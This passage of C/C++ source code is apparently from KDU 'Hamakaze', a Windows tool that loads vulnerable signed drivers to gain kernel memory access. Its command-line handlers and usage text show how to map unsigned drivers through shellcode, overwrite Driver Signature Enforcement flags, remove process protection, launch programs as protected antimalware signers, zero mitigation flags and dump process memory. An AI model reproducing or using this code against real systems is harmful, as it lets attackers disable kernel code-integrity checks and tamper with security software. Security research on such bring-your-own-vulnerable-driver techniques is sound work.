                "[!] Abort: selected provider require newer Windows NT version\r\n");

            break;
        }

        //
        // Let it burn if they want.
        //

        if (provLoadData->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
            if (NtBuildNumber > provLoadData->MaxNtBuildNumberSupport) {

                supPrintfEvent(kduEventError,
                    "[!] Warning: selected provider may not work on this Windows NT version\r\n");

            }
        }

        if (!KDUProviderVerifyActionType(prov, ActionType))
            break;

        ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeDebugPrivilege is not assigned!", ntStatus);
            break;
        }

        ntStatus = supEnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Abort: SeLoadDriverPrivilege is not assigned!", ntStatus);
            break;
        }

        if (provLoadData->UseSymbols) {
            if (!symInit()) {
                break;
            }
        }

        //
        // Allocate KDU_CONTEXT structure and fill it with data.
        //
        Context = (KDU_CONTEXT*)supHeapAlloc(sizeof(KDU_CONTEXT));
        if (Context == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: could not allocate provider context\r\n");

            break;
        }

        Context->Provider = prov;

        if (Context->Provider->Callbacks.ValidatePrerequisites)
            if (!Context->Provider->Callbacks.ValidatePrerequisites(Context))
            {
                supHeapFree(Context);
                Context = NULL;

                supPrintfEvent(kduEventError,
                    "[!] Abort: provider prerequisites are not meet\r\n");

                break;
            }

        if (provLoadData->NoVictim) {
            Context->Victim = NULL;
        }
        else {
            if (prov->LoadData->VictimId >= KDU_VICTIM_MAX)
                prov->LoadData->VictimId = KDU_VICTIM_DEFAULT;
            Context->Victim = &g_KDUVictims[prov->LoadData->VictimId];
        }

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(provLoadData->DriverName) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
        if (Context->DriverFileName == NULL) {
            supHeapFree(Context);
            Context = NULL;
        }
        else {

            Context->ShellVersion = ShellCodeVersion;
            Context->NtBuildNumber = NtBuildNumber;
            Context->ModuleBase = moduleBase;
            Context->NtOsBase = supGetNtOsBase();
            Context->MaximumUserModeAddress = supQueryMaximumUserModeAddress();
            Context->MemoryTag = supSelectNonPagedPoolTag();

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(Context->DriverFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            _strcat(Context->DriverFileName, TEXT("\\"));
            _strcat(Context->DriverFileName, provLoadData->DriverName);
            _strcat(Context->DriverFileName, TEXT(".sys"));

            if (Context->Provider->Callbacks.StartVulnerableDriver(Context)) {

                Context->ProviderState = StateLoaded;

                //
                // Register (unlock, send love letter, whatever this provider want first) driver.
                //
                if ((PVOID)Context->Provider->Callbacks.RegisterDriver) {

                    PVOID regParam;

                    if (provLoadData->NoVictim) {
                        regParam = (PVOID)Context;
                    }
                    else {
                        regParam = UlongToPtr(provLoadData->ResourceId);
                    }

                    if (!Context->Provider->Callbacks.RegisterDriver(
                        Context->DeviceHandle,
                        regParam))
                    {

                        supShowWin32Error("[!] Cannot register provider driver", GetLastError());

                        //
                        // This is hard error for some providers, abort execution.
                        //
                        KDUFallBackOnLoad(&Context);

                    }
                }

            }
            else {
                supHeapFree(Context->DriverFileName);
                supHeapFree(Context);
                Context = NULL;
            }

        }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return Context;
}

/*
* KDUProviderRelease
*
* Purpose:
*
* Release Provider context, free resources and unload driver.
*
*/
VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context)
{
    FUNCTION_ENTER_MSG(__FUNCTION__);

    if (Context) {

        if (Context->ProviderState == StateLoaded) {

            //
            // Unregister driver if supported.
            //
            if ((PVOID)Context->Provider->Callbacks.UnregisterDriver) {
                Context->Provider->Callbacks.UnregisterDriver(
                    Context->DeviceHandle,
                    (PVOID)Context);
            }

            if (Context->DeviceHandle) {
                NtClose(Context->DeviceHandle);
                Context->DeviceHandle = NULL;
            }

            if (Context->Provider->LoadData->NoUnloadSupported) {
                supPrintfEvent(kduEventInformation,
                    "[~] This driver does not support unload procedure, reboot PC to get rid of it\r\n");
            }
            else {

                //
                // Unload driver.
                //
                Context->Provider->Callbacks.StopVulnerableDriver(Context);

            }

            Context->ProviderState = StateUnloaded;
        }

        if (Context->DriverFileName) {
            supHeapFree(Context->DriverFileName);
            Context->DriverFileName = NULL;
        }

        supHeapFree(Context);
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

```

`Source/Hamakaze/kduprov.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2025
*
*  TITLE:       KDUPROV.H
*
*  VERSION:     1.44
*
*  DATE:        19 Aug 2025
*
*  Provider support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Providers abstraction interface.
//

//
// Prototype for read kernel virtual memory function.
//
typedef BOOL(WINAPI* provReadKernelVM)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

//
// Prototype for write kernel virtual memory function.
//
typedef BOOL(WINAPI* provWriteKernelVM)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

//
// Prototype for virtual to physical address translation function.
//
typedef BOOL(WINAPI* provVirtualToPhysical)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

//
// Prototype for read physical memory function.
//
typedef BOOL(WINAPI* provReadPhysicalMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

//
// Prototype for write physical memory function.
//
typedef BOOL(WINAPI* provWritePhysicalMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

//
// Prototype for query PML4 value function.
//
typedef BOOL(WINAPI* provQueryPML4)(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

//
// Prototype for driver registering/unlocking function.
//
typedef BOOL(WINAPI* provRegisterDriver)(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

//
// Prototype for driver unregistering function.
//
typedef BOOL(WINAPI* provUnregisterDriver)(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

//
// Prototype for driver specific pre-open actions.
//
typedef BOOL(WINAPI* provPreOpenDriver)(
    _In_opt_ PVOID Param
    );

//
// Prototype for driver specific post-open actions.
//
typedef BOOL(WINAPI* provPostOpenDriver)(
    _In_opt_ PVOID Param
    );

//
// Start/Stop prototypes.
//
typedef BOOL(WINAPI* provStartVulnerableDriver)(
    _In_ struct _KDU_CONTEXT* Context
    );
typedef void(WINAPI* provStopVulnerableDriver)(
    _In_ struct _KDU_CONTEXT* Context
    );

//
// Control DSE callback prototype
//
typedef BOOL(WINAPI* provControlDSE)(
    _In_ struct _KDU_CONTEXT* Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
    );

//
// Prototype for driver mapping action.
//
typedef BOOL(WINAPI* provMapDriver)(
    _In_ struct _KDU_CONTEXT *Context,
    _In_ PVOID ImageBase
    );

//
// Prototype for driver prerequisites validator.
//
typedef BOOL(WINAPI* provValidatePrerequisites)(
    _In_ struct _KDU_CONTEXT* Context
    );

//
// Prototype for process handle acquisition.
//
typedef BOOL(WINAPI* provOpenProcess)(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
    );

typedef enum _KDU_ACTION_TYPE {
    ActionTypeMapDriver = 0,
    ActionTypeDKOM,
    ActionTypeDSECorruption,
    ActionTypeDumpProcess,
    ActionTypeUnspecified,
    ActionTypeMax
} KDU_ACTION_TYPE;

typedef enum _KDU_PROVIDER_STATE {
    StateUnloaded = 0,
    StateLoaded,
    StateMax
} KDU_PROVIDER_STATE;

typedef struct _KDU_PROVIDER {
    PKDU_DB_ENTRY LoadData;
    struct {
        provStartVulnerableDriver StartVulnerableDriver;
        provStopVulnerableDriver StopVulnerableDriver;

        provRegisterDriver RegisterDriver; //optional
        provUnregisterDriver UnregisterDriver; //optional
        provPreOpenDriver PreOpenDriver; //optional;
        provPostOpenDriver PostOpenDriver; //optional;
        provMapDriver MapDriver;
        provControlDSE ControlDSE;

        provReadKernelVM ReadKernelVM; //optional
        provWriteKernelVM WriteKernelVM; //optional

        provVirtualToPhysical VirtualToPhysical; //optional
        provQueryPML4 QueryPML4Value; //optional
        provReadPhysicalMemory ReadPhysicalMemory; //optional
        provWritePhysicalMemory WritePhysicalMemory; //optional

        provValidatePrerequisites ValidatePrerequisites; //optional

        provOpenProcess OpenProcess; //optional

    } Callbacks;
} KDU_PROVIDER, * PKDU_PROVIDER;

typedef struct _KDU_CONTEXT {
    ULONG HvciEnabled;
    ULONG NtBuildNumber;
    ULONG ShellVersion;
    union {
        ULONG EncryptKey;
        ULONG MemoryTag;
    };
    
    // DB image base
    HINSTANCE ModuleBase;

    ULONG_PTR NtOsBase;
    ULONG_PTR NtOsMappedBase;
    union {
        HANDLE DeviceHandle;
        HANDLE PortHandle;
    };

    //full file name to the vulnerable driver
    PWSTR DriverFileName; 

    ULONG_PTR MaximumUserModeAddress;
    PKDU_PROVIDER Provider;
    PKDU_VICTIM_PROVIDER Victim;
    KDU_PROVIDER_STATE ProviderState;

    //fields used by shellcode v3 only
    FIXED_UNICODE_STRING DriverObjectName;
    FIXED_UNICODE_STRING DriverRegistryPath;

    //other
    ULONG64 ArbitraryData;

} KDU_CONTEXT, * PKDU_CONTEXT;

typedef struct _KDU_PHYSMEM_ENUM_PARAMS {
    _In_ BOOL bWrite;

    _In_ HANDLE DeviceHandle;
    _In_ provReadPhysicalMemory ReadPhysicalMemory;
    _In_ provWritePhysicalMemory WritePhysicalMemory;

    _In_opt_ PVOID pvPayload;
    _In_opt_ ULONG cbPayload;

    _Out_ SIZE_T ccPagesFound;
    _Out_ SIZE_T ccPagesModified;

    _In_ ULONG DispatchHandlerOffset;
    _In_ ULONG DispatchHandlerPageOffset;
    _In_ PVOID DispatchSignature;
    _In_ ULONG DispatchSignatureLength;
    _In_ ULONG JmpAddress;

} KDU_PHYSMEM_ENUM_PARAMS, * PKDU_PHYSMEM_ENUM_PARAMS;

ULONG KDUProvGetCount();
PKDU_DB KDUReferenceLoadDB();
VOID KDUProvList();

BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param);

_Success_(return != FALSE)
BOOL WINAPI KDUOpenProcess(
    _In_ struct _KDU_CONTEXT* Context,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

HINSTANCE KDUProviderLoadDB(
    VOID);

PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType);

VOID WINAPI KDUProviderRelease(
    _In_ KDU_CONTEXT * Context);

void KDUProvOpenVulnerableDriverAndRunCallbacks(
    _In_ KDU_CONTEXT* Context);

BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

BOOL KDUProvExtractVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

```

`Source/Hamakaze/main.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       MAIN.CPP
*
*  VERSION:     1.44
*
*  DATE:        19 Aug 2025
*
*  Hamakaze main logic and entrypoint.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#define CMD_PRV         L"-prv"
#define CMD_MAP         L"-map"
#define CMD_SCV         L"-scv"
#define CMD_PS          L"-ps"
#define CMD_PSE         L"-pse"
#define CMD_PSW         L"-psw"
#define CMD_PM          L"-pm"
#define CMD_PM1         L"-pm1"
#define CMD_PM2         L"-pm2"
#define CMD_DMP         L"-dmp"
#define CMD_DSE         L"-dse"
#define CMD_LIST        L"-list"
#define CMD_SI          L"-diag"
#define CMD_TEST        L"-test"
#define CMD_RNG         L"-rng"

#define CMD_DRVNAME     L"-drvn"
#define CMD_DRVREG      L"-drvr"

#define T_KDUUSAGE   "[?] No valid parameters combination specified or command is not recognized, see Usage for help\r\n"\
                     "[?] Usage: kdu [Provider][Command]\r\n\n"\
                     "Parameters: \r\n"\
                     "kdu -list         - List available providers\r\n"\
                     "kdu -diag         - Run system diagnostic for troubleshooting\r\n"\
                     "kdu -prv id       - Optional, sets provider id to be used with rest of commands, default 0\r\n"\
                     "kdu -dmp pid      - Dump virtual memory of the given process\r\n"\
                     "kdu -ps pid       - Disable ProtectedProcess for given pid\r\n"\
                     "kdu -pse cmdline  - Launch program as PsProtectedSignerAntimalware-Light\r\n"\
                     "kdu -psw cmdline  - Launch program as PsProtectedSignerWinTcb-Light\r\n"\
                     "kdu -pm pid       - Overwrites Process MitigationsFlags1 and 2 with 0x0 for given pid\r\n"\
                     "kdu -pm1 pid      - Overwrites Process MitigationsFlags1 with 0x0 for given pid\r\n"\
                     "kdu -pm2 pid      - Overwrites Process MitigationsFlags2 with 0x0 for given pid\r\n"\
                     "kdu -dse value    - Write user defined value to the system DSE state flags\r\n"\
                     "kdu -map filename - Map driver to the kernel and execute it entry point, this command have dependencies listed below\r\n"\
                     "-scv version      - Optional, select shellcode version, default 1\r\n"\
                     "-drvn name        - Driver object name (only valid for shellcode version 3)\r\n"\
                     "-drvr name        - Optional, driver registry key name (only valid for shellcode version 3)\r\n"

#define T_PRNTDEFAULT   "%s\r\n"

/*
* KDUProcessDmpSwitch
*
* Purpose:
*
* Handle -dmp switch.
*
*/
INT KDUProcessDmpSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ HANDLE ProcessId)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDumpProcess);

    if (provContext) {
        retVal = KDUDumpProcessMemory(provContext, ProcessId);
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessPSEObjectSwitch
*
* Purpose:
*
* Handle -pse and -psw switch.
*
*/
INT KDUProcessPSEObjectSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ LPWSTR CommandLine,
    _In_ BOOL HighestSigner
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDKOM);

    if (provContext) {
        retVal = KDURunCommandPPL(provContext, CommandLine, HighestSigner);
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessPMObjectSwitch
*
* Purpose:
*
* Handle -pm(1,2) switches.
*
*/
INT KDUProcessPMObjectSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG_PTR ProcessId,
	_In_ INT TargetedFlags
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDKOM);

    if (provContext) {
        retVal = KDUUnmitigateProcess(provContext, ProcessId, PS_NO_MITIGATIONS, TargetedFlags); // TODO: parametrize mitigations
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessPSObjectSwitch
*
* Purpose:
*
* Handle -ps switch.
*
*/
INT KDUProcessPSObjectSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG_PTR ProcessId
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDKOM);

    if (provContext) {
        retVal = KDUUnprotectProcess(provContext, ProcessId);
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessDSEFixSwitch
*
* Purpose:
*
* Handle -dse switch.
*
*/
INT KDUProcessDSEFixSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG DSEValue
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;
    ULONG_PTR ciVarAddress;

    provContext = KDUProviderCreate(ProviderId,
        HvciEnabled,
        NtBuildNumber,
        KDU_SHELLCODE_NONE,
        ActionTypeDSECorruption);

    if (provContext) {

        if (provContext->Provider->Callbacks.ControlDSE) {

            ciVarAddress = KDUQueryCodeIntegrityVariableSymbol(NtBuildNumber);
            if (ciVarAddress == 0) {
                ciVarAddress = KDUQueryCodeIntegrityVariableAddress(NtBuildNumber);
            }

            if (ciVarAddress == 0) {

                supPrintfEvent(kduEventError,
                    "[!] Could not query system variable address, abort.\r\n");

            }
            else {

                retVal = provContext->Provider->Callbacks.ControlDSE(provContext,
                    DSEValue,
                    ciVarAddress);

            }

        }
        KDUProviderRelease(provContext);
    }

    return retVal;
}

/*
* KDUProcessDrvMapSwitch
*
* Purpose:
*
* Handle -map switch.
*
*/
INT KDUProcessDrvMapSwitch(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ProviderId,
    _In_ ULONG ShellVersion,
    _In_ LPWSTR DriverFileName,
    _In_opt_ LPWSTR DriverObjectName,
    _In_opt_ LPWSTR DriverRegistryPath
)
{
    INT retVal = 0;
    KDU_CONTEXT* provContext;

    if (!RtlDoesFileExists_U(DriverFileName)) {

        supPrintfEvent(kduEventError,
            "[!] Input file cannot be found, abort.\r\n");

        return 0;
    }

    printf_s("[*] Driver mapping using shellcode version: %lu\r\n", ShellVersion);

    if (ShellVersion == KDU_SHELLCODE_V3) {

        if (DriverObjectName == NULL) {

            supPrintfEvent(kduEventError, "[!] Driver object name is required when working with this shellcode\r\n"\
                "[?] Use the following commands to supply object name and optionally registry key name\r\n"\
                "\t-drvn [ObjectName] and/or\r\n"\
                "\t-drvr [ObjectKeyName]\r\n"\
                "\te.g. kdu -scv 3 -drvn MyName -map MyDriver.sys\r\n"
            );

            return 0;
        }
        else {
            printf_s("[+] Driver object name: \"%ws\"\r\n", DriverObjectName);
        }

        if (DriverRegistryPath) {
            printf_s("[+] Registry key name: \"%ws\"\r\n", DriverRegistryPath);
        }
        else {
            printf_s("[+] No driver registry key name specified, driver object name will be used instead\r\n");
        }

    }

    PVOID pvImage = NULL;
    NTSTATUS ntStatus = supLoadFileForMapping(DriverFileName, &pvImage);

    if ((!NT_SUCCESS(ntStatus)) || (pvImage == NULL)) {
        supShowHardError("[!] Error while loading input driver file", ntStatus);
        return 0;
    }
    else {
        printf_s("[+] Input driver file \"%ws\" loaded at 0x%p\r\n", DriverFileName, pvImage);

        provContext = KDUProviderCreate(ProviderId,
            HvciEnabled,
            NtBuildNumber,
            ShellVersion,
            ActionTypeMapDriver);

        if (provContext) {

            if (ShellVersion == KDU_SHELLCODE_V3) {

                if (DriverObjectName) {
                    ScCreateFixedUnicodeString(&provContext->DriverObjectName,
                        DriverObjectName);

                }

                //
                // Registry path name is optional.
                // If not specified we will assume its the same name as driver object.
                //
                if (DriverRegistryPath) {
                    ScCreateFixedUnicodeString(&provContext->DriverRegistryPath,
                        DriverRegistryPath);
                }

            }

            retVal = provContext->Provider->Callbacks.MapDriver(provContext, pvImage);
            KDUProviderRelease(provContext);
        }

        LdrUnloadDll(pvImage);
    }

    return retVal;
}

/*
* KDUProcessCommandLine
*
* Purpose:
*
* Parse command line and do stuff.
*
*/
INT KDUProcessCommandLine(
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber
)
{
    INT         retVal = 0;
    ULONG       providerId = KDU_PROVIDER_DEFAULT, dseValue = 0, paramLength = 0, shellVersion;
    ULONG_PTR   processId;
    LPWSTR      lpParam1, lpParam2;
    WCHAR       szParameter[MAX_PATH], szExtraParameter[MAX_PATH];

    FUNCTION_ENTER_MSG(__FUNCTION__);

    RtlSecureZeroMemory(szParameter, sizeof(szParameter));
    RtlSecureZeroMemory(szExtraParameter, sizeof(szExtraParameter));

    do {

#ifdef _DEBUG

        //
        // Test switches, never used/present in the release build.
        //

        if (supGetCommandLineOption(CMD_TEST,
            FALSE,
            NULL,
            0,
            NULL))
        {
            KDUTest();
            retVal = 1;
            break;
        }

        if (supGetCommandLineOption(CMD_RNG,
            FALSE,
            NULL,
            0,
            NULL))
        {
            DWORD dwKey = 0;
            if (supGenRandom((PBYTE)&dwKey, sizeof(DWORD))) {
                printf_s("[+] RNG: %lu\r\n", dwKey);
            }
            else {
                printf_s("[!] RNG failed\r\n");
            }
            retVal = 1;
            break;
        }

#endif
        //
        // List providers.
        //
        if (supGetCommandLineOption(CMD_LIST,
            FALSE,
            NULL,
            0,
            NULL))
        {
            KDUProvList();
            retVal = 1;
            break;
        }

        //
        // List system information
        //
        if (supGetCommandLineOption(CMD_SI,
            FALSE,
            NULL,
            0,
            NULL))
        {
            KDUDiagStart();
            retVal = 1;
            break;
        }

        //
        // Select CVE provider.
        //
        if (supGetCommandLineOption(CMD_PRV,
            TRUE,
            szParameter,
            RTL_NUMBER_OF(szParameter),
            NULL))
        {
            providerId = _strtoul(szParameter);
            if (providerId >= KDUProvGetCount()) {

                supPrintfEvent(kduEventError,
                    "[!] Invalid provider id %lu specified, default will be used (%lu)\r\n",
                    providerId,
                    KDU_PROVIDER_DEFAULT);

                providerId = KDU_PROVIDER_DEFAULT;

            }

            printf_s("[+] Selected provider: %lu\r\n", providerId);
        }

        //
        // Mutually exclusive commands.
        // -dse -map -ps
        //

        //
        // Check if -dse specified.
        //
        if (supGetCommandLineOption(CMD_DSE,
            TRUE,
            szParameter,
            RTL_NUMBER_OF(szParameter),
            NULL))
        {
            dseValue = _strtoul(szParameter);
            retVal = KDUProcessDSEFixSwitch(HvciEnabled,
                NtBuildNumber,
                providerId,
                dseValue);
        }
        else

            //
            // Check if -map specified.
            //
            if (supGetCommandLineOption(CMD_MAP,
                TRUE,
                szParameter,
                RTL_NUMBER_OF(szParameter),
                &paramLength))
            {
                if (paramLength == 0) {

                    supPrintfEvent(kduEventError,
                        "[!] Input file not specified\r\n");

                }
                else {

                    //
                    // Shell selection, -scv switch.
                    //
                    shellVersion = KDU_SHELLCODE_V1;

                    if (supGetCommandLineOption(CMD_SCV,
                        TRUE,
                        szExtraParameter,
                        RTL_NUMBER_OF(szExtraParameter),
                        NULL))
                    {
                        shellVersion = _strtoul(szExtraParameter);
                        if (shellVersion == 0 || shellVersion > KDU_SHELLCODE_VMAX) {

                            supPrintfEvent(kduEventError,
                                "[!] Unrecognized shellcode version %lu, default will be used (%lu)\r\n",
                                shellVersion,
                                KDU_SHELLCODE_V1);

                            shellVersion = KDU_SHELLCODE_V1;
                        }
                    }

                    WCHAR szDriverName[MAX_PATH], szDriverRegPath[MAX_PATH];

                    //
                    // Process extra DRVN/DRVR commands if present.
                    //
                    RtlSecureZeroMemory(szDriverName, sizeof(szDriverName));
                    paramLength = 0;
                    supGetCommandLineOption(CMD_DRVNAME,
                        TRUE,
                        szDriverName,
                        RTL_NUMBER_OF(szDriverName),
                        &paramLength);

                    lpParam1 = (paramLength != 0) ? szDriverName : NULL;

                    RtlSecureZeroMemory(szDriverRegPath, sizeof(szDriverRegPath));
                    paramLength = 0;
                    supGetCommandLineOption(CMD_DRVREG,
                        TRUE,
                        szDriverRegPath,
                        RTL_NUMBER_OF(szDriverRegPath),
                        &paramLength);

                    lpParam2 = (paramLength != 0) ? szDriverRegPath : NULL;

                    retVal = KDUProcessDrvMapSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        shellVersion,
                        szParameter,
                        lpParam1,
                        lpParam2);

                }
            }

            else

                //
                // Check if -ps specified.
                //
                if (supGetCommandLineOption(CMD_PS,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPSObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        processId);
                }

                else if (supGetCommandLineOption(CMD_PM,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPMObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        processId,
                        PS_MITIGATION_FLAGS1 | PS_MITIGATION_FLAGS2);
                }

                else if (supGetCommandLineOption(CMD_PM1,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPMObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        processId,
                        PS_MITIGATION_FLAGS1);
                }

                else if (supGetCommandLineOption(CMD_PM2,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPMObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        processId,
                        PS_MITIGATION_FLAGS2);
                }

                else if (supGetCommandLineOption(CMD_PSE,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    retVal = KDUProcessPSEObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        szParameter,
                        FALSE);
                }

                else if (supGetCommandLineOption(CMD_PSW,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    retVal = KDUProcessPSEObjectSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        szParameter, 
                        TRUE);
                }

                else if (supGetCommandLineOption(CMD_DMP,
                    TRUE,
                    szParameter,
                    RTL_NUMBER_OF(szParameter),
                    NULL))
                {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessDmpSwitch(HvciEnabled,
                        NtBuildNumber,
                        providerId,
                        (HANDLE)processId);
                }

                else {
                    //
                    // Nothing set, show help.
                    //
                    printf_s(T_PRNTDEFAULT, T_KDUUSAGE);
                }

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return retVal;
}

/*
* KDUMain
*
* Purpose:
*
* KDU main.
*
*/
int KDUMain()
{
    INT iResult = 0;
    OSVERSIONINFO osv;

#ifdef _DEBUG
    printf_s("[*] Debug Mode Run, several features (like a shellcode proper generation) will be unavailable\r\n");
#endif

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        CHAR vendorString[0x20];

        RtlFillMemory(vendorString, sizeof(vendorString), 0);
        GET_CPU_VENDOR_STRING(vendorString);
        printf_s("[*] CPU vendor string: %s\r\n", vendorString);

        RtlSecureZeroMemory(&osv, sizeof(osv));
        osv.dwOSVersionInfoSize = sizeof(osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
        if ((osv.dwMajorVersion < 6) ||
            (osv.dwMajorVersion == 6 && osv.dwMinorVersion == 0) ||
            (osv.dwBuildNumber == NT_WIN7_RTM))
        {

            supPrintfEvent(kduEventError,
                "[!] Unsupported WinNT version\r\n");

            iResult = ERROR_UNKNOWN_REVISION;
            break;
        }

        if (!ntsupUserIsFullAdmin()) {
            supPrintfEvent(kduEventError, "[!] Administrator privileges are required to continue.\r\n"\
                "[!] Verify that you have sufficient privileges and you are not running program under any compatibility layer.\r\n");
            iResult = ERROR_PRIVILEGE_NOT_HELD;
            break;
        }

        CHAR szVersion[100];

        StringCchPrintfA(szVersion, 100,
            "[*] Windows version: %u.%u build %u",
            osv.dwMajorVersion,
            osv.dwMinorVersion,
            osv.dwBuildNumber);

        printf_s(T_PRNTDEFAULT, szVersion);

        BOOLEAN secureBoot;

        if (supQuerySecureBootState(&secureBoot)) {
            printf_s("[*] SecureBoot is %sbled on this machine\r\n", secureBoot ? "ena" : "disa");
        }

        BOOLEAN hvciEnabled;
        BOOLEAN hvciStrict;
        BOOLEAN hvciIUM;

        //
        // Providers maybe *not* HVCI compatible.
        //
        if (supQueryHVCIState(&hvciEnabled, &hvciStrict, &hvciIUM)) {

            if (hvciEnabled) {
                printf_s("[*] Windows HVCI mode detected\r\n");
            }

        }

